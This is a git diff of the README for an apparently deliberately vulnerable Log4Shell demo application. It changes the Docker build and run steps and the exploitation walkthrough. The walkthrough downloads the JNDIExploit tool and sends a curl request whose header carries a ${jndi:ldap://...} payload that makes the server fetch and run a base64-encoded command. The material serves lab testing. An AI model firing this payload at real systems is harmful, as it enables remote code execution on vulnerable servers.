@@ -9,16 +9,11 @@ It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.
 ## Running the application
 
 Run it:
-
-```bash
-docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 ```
+docker build -t mukeshkhattar/log4shell-vulnerable-app .
+docker push mukeshkhattar/log4shell-vulnerable-app
+docker run --name log4shell-vulnerable-app -p 8080:8080 mukeshkhattar/log4shell-vulnerable-app
 
-Build it yourself (you don't need any Java-related tooling):
-
-```bash
-docker build . -t vulnerable-app
-docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 ```
 
 ## Exploitation steps
@@ -30,14 +25,14 @@ docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 ```bash
 wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
 unzip JNDIExploit.v1.2.zip
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -p 8888
 ```
 
 * Then, trigger the exploit using:
 
 ```bash
 # will execute 'touch /tmp/pwned'
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+curl 192.168.1.188:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.188:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 ```
 
 * Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:
